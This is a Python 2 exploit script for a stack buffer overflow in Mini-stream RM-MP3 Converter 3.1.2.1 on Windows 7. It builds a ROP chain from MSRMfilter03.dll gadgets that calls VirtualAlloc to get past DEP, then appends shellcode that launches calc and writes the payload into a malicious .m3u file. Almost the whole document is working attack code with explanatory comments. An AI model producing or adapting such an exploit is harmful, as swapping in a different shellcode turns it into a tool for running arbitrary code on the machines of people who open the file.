#!/usr/bin/python2

#---------------------------------------------------------------------#
# Exploit: Mini-stream RM-MP3 Converter 3.1.2.1 ROP (*.m3u)           #
# OS: Windows 7 Enterprise SP1 Build 7601                             #
# Architecture: x86                                                   #
#---------------------------------------------------------------------#
 
import sys, struct
 
file="crash.m3u"

#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          => dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, => flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         => flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------[Register Layout]-#
# Remember (1) the  stack  grows  downwards  so we  need to load the  #
# values into the registers in reverse order! (2) We are going to do  #
# some clever  trickery to  align our  return after  executing.  To   #
# acchieve this we will be filling EDI with a ROP-Nop and we will be  #
# skipping ESP leaving it intact.                                     #
#                                                                     #
# EAX 90909090 => Nop                                                 #
# ECX 00000040 => flProtect                                           #
# EDX 00001000 => flAllocationType                                    #
# EBX 00000001 => dwSize                                              #
# ESP ???????? => Leave as is                                         #
# EBP ???????? => Call to ESP (jmp, call, push,..)                    #
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of 0x1005d060       #
# EDI 10019C60 => ROP-Nop same as EIP                                 #
#---------------------------------------------------------------------#

rop = struct.pack('<L',0x41414141)  # Padding to compensate 4 bytes at ESP

# EDI -> ROP-Nop
rop += struct.pack('<L',0x10029b57) # POP EDI # RETN
rop += struct.pack('<L',0x1002b9ff) # ROP-Nop

# ECX -> flProtect (0x40)
rop += struct.pack('<L',0x100280de) # POP ECX # RETN
rop += struct.pack('<L',0xffffffff) # Will become 0x40
rop += struct.pack('<L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN (0x0)
rop += struct.pack('<L',0x1002e01b) # INC ECX # MOV DWORD PTR DS:[EDX],ECX # RETN (0x1)
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN (0x2)
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN (0x4)
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN (0x8)
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN (0x10)
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN (0x20)
rop += struct.pack('<L',0x1002a487) # ADD ECX,ECX # RETN (0x40)

# ESI -> VirtualAlloc
rop += struct.pack('<L',0x1002ba02) # POP EAX # RETN
rop += struct.pack('<L',0x1005d060) # kernel32.virtualalloc
rop += struct.pack('<L',0x10027f59) # MOV EAX,DWORD PTR DS:[EAX] # RETN
rop += struct.pack('<L',0x1005bb8e) # PUSH EAX # ADD DWORD PTR SS:[EBP+5],ESI # PUSH 1 # POP EAX # POP ESI # RETN

# EDX -> flAllocationType (0x1000)
rop += struct.pack('<L',0x1003fb3f) # MOV EDX,E58B0001 # POP EBP # RETN
rop += struct.pack('<L',0x41414141) # padding for POP EBP
rop += struct.pack('<L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('<L',0x1A750FFF) # ebx+edx => 0x1000 flAllocationType
rop += struct.pack('<L',0x10029f3e) # ADD EDX,EBX # POP EBX # RETN 10
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate
rop += struct.pack('<L',0x1002b9ff) # Rop-Nop to compensate

# EBP -> Call ESP
rop += struct.pack('<L',0x100532ed) # POP EBP # RETN
rop += struct.pack('<L',0x100371f5) # CALL ESP

# EBX -> dwSize (0x1) 
rop += struct.pack('<L',0x10013b1c) # POP EBX # RETN
rop += struct.pack('<L',0xffffffff) # Will become 0x1
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN
rop += struct.pack('<L',0x100319d3) # INC EBX # FPATAN # RETN

# EAX -> NOP
rop += struct.pack('<L',0x10030361) # POP EAX # RETN
rop += struct.pack('<L',0x90909090) # NOP

# Push all registers
rop += struct.pack('<L',0x10014720) # PUSHAD # RETN

calc = (
"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64"
"\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B"
"\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20"
"\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07"
"\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74"
"\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7")
 
#---------------------------------------------------------------------#
# Badchars: '\x00\x09\x0a'                                            #
# kernel32.virtualalloc: 0x1005d060 (MSRMfilter03.dll)                #
# EIP: 0x10019C60 Random RETN (MSRMfilter03.dll)                      #
#---------------------------------------------------------------------#
shell = "\x90"*5 + calc
crash = "http://." + "A"*17416 + "\x60\x9C\x01\x10" + rop + shell + "C"*(7572-len(rop + shell))
 
writeFile = open (file, "w")
writeFile.write( crash )
writeFile.close()

